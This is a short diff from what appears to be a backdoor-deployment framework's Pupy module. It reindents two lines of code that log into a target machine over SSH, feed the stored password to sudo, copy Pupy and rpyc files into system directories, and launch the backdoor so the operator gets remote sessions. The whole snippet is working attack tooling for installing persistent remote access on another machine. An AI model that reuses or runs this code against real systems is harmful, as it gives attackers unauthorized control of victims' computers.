@@ -22,13 +22,13 @@ class Pupy(Backdoor):
         port = self.get_value("port")
         target = self.core.curtarget
         print("Thanks to n1nj4sec for the pupy backdoor. Note that this script must be run with sudo.")        
-	os.system("rm pupy/pupy/packages/all/scapy")
+        os.system("rm pupy/pupy/packages/all/scapy")
         target.ssh.exec_command("echo " + target.pword + ' | sudo -S rm -rf pupy')
         target.scpFiles(self, 'pupy/pupy', True)
         target.scpFiles(self, 'rpyc', True)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
         raw_input("Please navigate to the backdoorme/pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
-	target.ssh.exec_command(self.get_command())
+        target.ssh.exec_command(self.get_command())
         
         raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
 
